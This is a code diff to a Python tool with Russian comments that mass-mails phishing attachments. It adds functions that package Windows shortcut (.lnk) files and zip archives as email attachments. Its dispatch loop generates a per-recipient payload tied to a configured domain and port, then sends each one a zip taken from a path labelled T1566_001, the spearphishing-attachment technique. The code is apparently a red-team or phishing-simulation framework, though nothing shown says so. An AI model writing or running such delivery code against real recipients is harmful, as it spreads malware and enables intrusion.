@@ -11,15 +11,36 @@ def load_attachment(msg, attachment_path):
     with open(attachment_path, "rb") as attachment:
         part = MIMEBase("application", "octet-stream")
         part.set_payload(attachment.read())
-
     encoders.encode_base64(part)
     part.add_header(
         "Content-Disposition", f"attachment; filename={os.path.basename(attachment_path)}"
     )
     msg.attach(part)
 
+
+def load_attachment_lnk(msg, attachment_path):
+    with open(attachment_path, "rb") as attachment:
+        part = MIMEBase("application", "x-ms-shortcut")
+        part.set_payload(attachment.read())
+    encoders.encode_base64(part)
+    part.add_header(
+        "Content-Disposition", f"attachment; filename={os.path.basename(attachment_path)}"
+    )
+    msg.attach(part)
+
+
+def load_attachment_zip(msg, attachment_path):
+    with open(attachment_path, "rb") as attachment:
+        part = MIMEBase("application", "zip")
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(attachment_path)}")
+        msg.attach(part)
+
+
 # Функция для отправки email
 def send_email_with_attachment(configs, recipient, target_content, attachment_path):
+    print("ATTACHMENT PATH:", attachment_path)
     # Создаем письмо
     msg = MIMEMultipart()
     msg["From"] = configs["SMTP_USER"]
@@ -29,7 +50,7 @@ def send_email_with_attachment(configs, recipient, target_content, attachment_pa
     body = target_content.message
     msg.attach(MIMEText(body, "plain"))
 
-    load_attachment(msg, attachment_path)
+    load_attachment_zip(msg, attachment_path)
     log(f"Attach loaded to email.", "INFO")
     log(f"Connecting to SMTP-server ...", "INFO")
     # Отправка письма через SMTP_SSL
@@ -49,11 +70,10 @@ def send_email_with_attachment(configs, recipient, target_content, attachment_pa
 def mass_email_dispatch(configs, target_content, target_payload, recipients):
     for recipient in recipients:
         log(f"Generating payload for {recipient.email}...", "INFO")
-        print("\n")
         generate_payloads(configs["DOMAIN_NAME"], configs["PORT"], recipient, target_payload)
 
         log(f"Sending mail for {recipient.email}.", "INFO")
 
-        send_email_with_attachment(configs, recipient, target_content, target_payload.attachment_path)
+        send_email_with_attachment(configs, recipient, target_content, "payloads/T1566_001/test.zip")
 
 
